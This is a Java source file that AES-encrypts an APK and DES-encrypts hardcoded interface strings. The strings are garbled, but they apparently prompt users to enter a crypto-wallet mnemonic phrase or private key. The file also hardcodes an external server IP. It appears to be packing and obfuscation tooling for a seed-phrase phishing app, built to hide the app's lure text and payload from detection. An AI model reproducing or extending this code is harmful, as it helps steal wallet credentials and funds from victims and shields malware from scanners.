package byc;

import java.io.File;

import encrypt.AES;
import encrypt.DES;

public class Main {
	public static final String FILE_NAME = "app.apk";
	public static final String WORK_DIR = "force";
	
	private static final String KEY = "9ba45bfd500642328ec03ad8ef1b6e75";// �Զ�����Կ
	private static DES des = null;
	
	public static final String HOST2 = "103.97.3.61";
	public static final String HOST = "192.168.1.8";
	public static final String friendly_tips = "Ϊ�������õ�ʹ��%s���������%s����ɫ������Ҫ��%s�����ϰ����ܣ��Ƿ�����ȥ������";
	public static final String tvTitle = "�����������Ǵʴ���%sǮ��";
	public static final String tvhint= "���������Ǵʻ�˽Կ";
	public static final String tvSay1 = "*���Ǵ���һ��������ɵ�12��Ӣ�ĵ��ʡ�";
	public static final String tvSay2= "*˽Կ��һ�������޹�����ַ�����";
	
	public volatile static String uIP="";//���·�������ַ
	
	
	public static void main(String[] args) {
		encryptFiles();
		//encryptStrings();

	}
	private static void encryptFiles(){
		String filename=WORK_DIR+File.separator+FILE_NAME;
		AES.lock(new File(filename));
		//AES.unlock(new File(filename));
		System.out.println("������ɣ�" + filename);
	}
	private static void encryptStrings(){
	    //************************************�����ַ���*********************************
		des = DES.getDes(KEY);
		encryptstring(friendly_tips);
        encryptstring(tvTitle);
		encryptstring(tvhint);
		encryptstring(tvSay1);
		encryptstring(tvSay2);
		
		encryptstring("a01");
		encryptstring("a02");
		encryptstring("a03");
		encryptstring("a04");
		encryptstring("a05");
	}
	private  static void encryptstring(String str){
		try {
			
			System.out.println("����ǰ���ַ���" + str);
			String res=des.encode(str);
			System.out.println("���ܺ���ַ���" + res);
			System.out.println("���ܺ���ַ���" + des.decode(des.encode(str)));
			
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
